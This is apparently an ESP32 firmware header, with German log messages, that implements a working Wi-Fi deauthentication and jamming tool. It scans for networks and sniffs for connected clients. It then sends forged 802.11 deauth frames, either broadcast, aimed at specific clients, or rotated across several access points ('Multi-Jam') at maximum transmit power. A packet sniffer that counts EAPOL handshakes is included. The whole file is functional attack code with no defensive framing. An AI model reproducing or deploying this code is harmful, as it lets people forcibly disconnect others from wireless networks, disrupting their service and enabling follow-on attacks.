#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_mac.h>

void ensureBLEOffForWiFi();

struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};
const uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define MAX_SCANNED_NETWORKS 20
#define MAX_CLIENTS 10

WiFiNetwork scannedNetworks[MAX_SCANNED_NETWORKS];
int networkCount = 0;
int targetChannel = 1;
uint8_t targetBSSID[6];
bool deauthRunning = false;
bool deauthExecuted = false;
bool scanning = false;
bool deauthScanRunning = false;
int deauthTargetIdx = 0;
String deauthTargetName = "";

struct JamAP { uint8_t bssid[6]; int channel; };
JamAP jamAPs[8];
int jamAPCount = 0;

bool jamSelected[MAX_SCANNED_NETWORKS];
int jamSelCount = 0;

void toggleJamSelect(int idx) {
  if (idx < 0 || idx >= networkCount) return;
  if (jamSelected[idx]) {
    jamSelected[idx] = false;
    jamSelCount--;
  } else if (jamSelCount < 8) {
    jamSelected[idx] = true;
    jamSelCount++;
  }
}

extern unsigned long lastDeauthMillis;

bool snifferRunning = false;
bool snifferAutoHop = true;
int snifferChannel = 1;
const int snifferHopInterval = 300;
unsigned long lastChannelHop = 0;
unsigned long lastSnifferDisplay = 0;
volatile unsigned long packetCount = 0;
volatile unsigned long deauthCount = 0;
volatile unsigned long eapolCount = 0;

struct ClientInfo {
  uint8_t mac[6];
  unsigned long lastSeen;
  int rssi;
  bool dropped;
};
ClientInfo clients[MAX_CLIENTS];
volatile int clientCount = 0;
volatile bool clientScanActive = false;
volatile int droppedClients = 0;
bool deauthClientMode = false;
uint8_t targetClientMAC[6];
unsigned long deauthSent = 0;
uint8_t ownMAC[6] = {0,0,0,0,0,0};

void initDeauth() {
  deauthRunning = false;
  deauthExecuted = false;
}

void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type);

void startWiFiScan() {
  Serial.println("[*] Scanning for WLAN networks...");
  ensureBLEOffForWiFi();
  scanning = true;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(300);
  WiFi.scanDelete();
  WiFi.scanNetworks(true);
}

void startDeauthScan() {
  Serial.println("[*] Deauth scan started...");
  jamSelCount = 0;
  for (int i = 0; i < MAX_SCANNED_NETWORKS; i++) jamSelected[i] = false;
  deauthScanRunning = true;
  networkCount = 0;
  clientCount = 0;
  clientScanActive = false;
  deauthClientMode = false;
  deauthSent = 0;
  ensureBLEOffForWiFi();
  WiFi.mode(WIFI_STA);
  delay(300);
  WiFi.setAutoReconnect(false);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  WiFi.scanNetworks(true);
}

void startDeauth(int index) {
  if (index < 0 || index >= networkCount) return;
  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;
  deauthTargetIdx = index;
  deauthTargetName = scannedNetworks[index].ssid;
  jamAPCount = 0;
  if (deauthTargetName.length() > 0) {
    for (int i = 0; i < networkCount && jamAPCount < 8; i++) {
      if (scannedNetworks[i].ssid == deauthTargetName) {
        memcpy(jamAPs[jamAPCount].bssid, scannedNetworks[i].bssid, 6);
        jamAPs[jamAPCount].channel = scannedNetworks[i].channel;
        jamAPCount++;
      }
    }
  }
  if (jamAPCount == 0) {
    memcpy(jamAPs[0].bssid, targetBSSID, 6);
    jamAPs[0].channel = targetChannel;
    jamAPCount = 1;
  }
  clientCount = 0;
  clientScanActive = true;
  deauthRunning = false;
  deauthClientMode = false;
  droppedClients = 0;
  for (int i = 0; i < MAX_CLIENTS; i++) clients[i].dropped = false;
  esp_read_mac(ownMAC, ESP_MAC_WIFI_STA);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setAutoReconnect(false);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_max_tx_power(78);
  Serial.printf("[*] Ziel: %s (ch %d) - sammle Clients...\n",
                deauthTargetName.c_str(), targetChannel);
}

void startDeauthMulti() {
  jamAPCount = 0;
  for (int i = 0; i < networkCount && jamAPCount < 8; i++) {
    if (!jamSelected[i]) continue;
    memcpy(jamAPs[jamAPCount].bssid, scannedNetworks[i].bssid, 6);
    jamAPs[jamAPCount].channel = scannedNetworks[i].channel;
    jamAPCount++;
  }
  if (jamAPCount == 0) return;
  deauthTargetName = "Multi-Jam";
  targetChannel = jamAPs[0].channel;
  deauthTargetIdx = -1;
  clientCount = 0;
  clientScanActive = false;
  deauthClientMode = false;
  deauthRunning = true;
  deauthSent = 0;
  droppedClients = 0;
  esp_read_mac(ownMAC, ESP_MAC_WIFI_STA);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setAutoReconnect(false);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(78);
  lastDeauthMillis = millis();
  Serial.printf("[*] Multi-Jam gestartet: %d APs\n", jamAPCount);
}

void startDeauthAttack(bool allClients) {
  deauthClientMode = !allClients;
  deauthSent = 0;
  deauthRunning = true;
  clientScanActive = true;
  droppedClients = 0;
  for (int i = 0; i < clientCount; i++) clients[i].dropped = false;
  lastDeauthMillis = millis();
  Serial.printf("[*] Deauth gestartet (%s), %d Client(s) bekannt\n",
                deauthClientMode ? "gezielt" : "broadcast", clientCount);
}

void txDeauthFrame(uint8_t *packet, const uint8_t *dst, uint16_t &seq) {
  memcpy(&packet[4], dst, 6);
  packet[22] = seq & 0xFF;
  packet[23] = (seq >> 8) & 0xFF;
  seq++;
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true);
  if (err != ESP_OK) {
    Serial.printf("[!] TX %s\n", esp_err_to_name(err));
  }
  deauthSent++;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  static uint16_t seq = 0;
  static int nextClient = 0;
  static int jamIdx = 0;

    if (deauthClientMode) {
    memcpy(&packet[10], targetBSSID, 6);
    memcpy(&packet[16], targetBSSID, 6);
    txDeauthFrame(packet, targetClientMAC, seq);
    return;
  }

  if (jamAPCount > 1) {
    JamAP &ap = jamAPs[jamIdx];
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    targetChannel = ap.channel;
    memcpy(&packet[10], ap.bssid, 6);
    memcpy(&packet[16], ap.bssid, 6);
    txDeauthFrame(packet, broadcastMAC, seq);
    jamIdx = (jamIdx + 1) % jamAPCount;
    } else {
    memcpy(&packet[10], targetBSSID, 6);
    memcpy(&packet[16], targetBSSID, 6);
    txDeauthFrame(packet, broadcastMAC, seq);
    if (clientCount > 0) {
      txDeauthFrame(packet, clients[nextClient].mac, seq);
      nextClient = (nextClient + 1) % clientCount;
    }
  }
}

void stopDeauth() {
  deauthRunning = false;
  deauthExecuted = false;
  clientScanActive = false;
  esp_wifi_set_promiscuous(false);
  WiFi.setSleep(true);
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
  WiFi.setAutoReconnect(true);
  Serial.println("[*] Deauth gestoppt");
}

void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  packetCount++;

  if (clientScanActive && len >= 16) {
    uint8_t *src = frame + 10;
    if ((src[0] & 0x01) == 0) {
      bool isOwn = true;
      for (int i = 0; i < 6; i++) {
        if (src[i] != ownMAC[i]) { isOwn = false; break; }
      }
      bool isAP = false;
      if (!isOwn) {
        for (int i = 0; i < networkCount && !isAP; i++) {
          bool same = true;
          for (int j = 0; j < 6; j++) {
            if (scannedNetworks[i].bssid[j] != src[j]) { same = false; break; }
          }
          if (same) isAP = true;
        }
      }
      if (!isOwn && !isAP) {
        int idx = -1;
        for (int i = 0; i < clientCount; i++) {
          bool same = true;
          for (int j = 0; j < 6; j++) {
            if (clients[i].mac[j] != src[j]) { same = false; break; }
          }
          if (same) { idx = i; break; }
        }
        if (idx >= 0) {
          clients[idx].lastSeen = millis();
          clients[idx].rssi = pkt->rx_ctrl.rssi;
        } else if (clientCount < MAX_CLIENTS) {
          memcpy(clients[clientCount].mac, src, 6);
          clients[clientCount].lastSeen = millis();
          clients[clientCount].rssi = pkt->rx_ctrl.rssi;
          clientCount++;
        }
      }
    }
  }

  if (len < 24) return;
  uint8_t frametype = frame[0] & 0x0C;
  uint8_t subtype   = frame[0] >> 4;

  if (frametype == 0x00 && (subtype == 0x0A || subtype == 0x0C)) {
    deauthCount++;
  }
  else if (frametype == 0x08) {
    int start = ((subtype & 0x08) != 0) ? 26 : 24;
    int end = len - 2;
    if (end > 44) end = 44;
    if (start + 1 <= end) {
      for (int i = start; i <= end - 1; i++) {
        if (frame[i] == 0x88 && frame[i + 1] == 0x8E) {
          eapolCount++;
          break;
        }
      }
    }
  }
}

void startSniffer() {
  ensureBLEOffForWiFi();
  packetCount = 0;
  deauthCount = 0;
  eapolCount = 0;
  snifferChannel = 1;
  snifferAutoHop = true;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setAutoReconnect(false);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_max_tx_power(78);
  snifferRunning = true;
  lastChannelHop = millis();
  lastSnifferDisplay = millis();
  Serial.println("[*] Sniffer gestartet");
}

void setSnifferChannel(int chan) {
  if (chan < 1) chan = 13;
  if (chan > 13) chan = 1;
  snifferChannel = chan;
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  lastChannelHop = millis();
}

void stopSniffer() {
  snifferRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.setSleep(true);
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
  WiFi.setAutoReconnect(true);
  Serial.printf("[*] Sniffer gestoppt: %lu Pkts, %lu Deauth, %lu EAPOL\n",
                packetCount, deauthCount, eapolCount);
}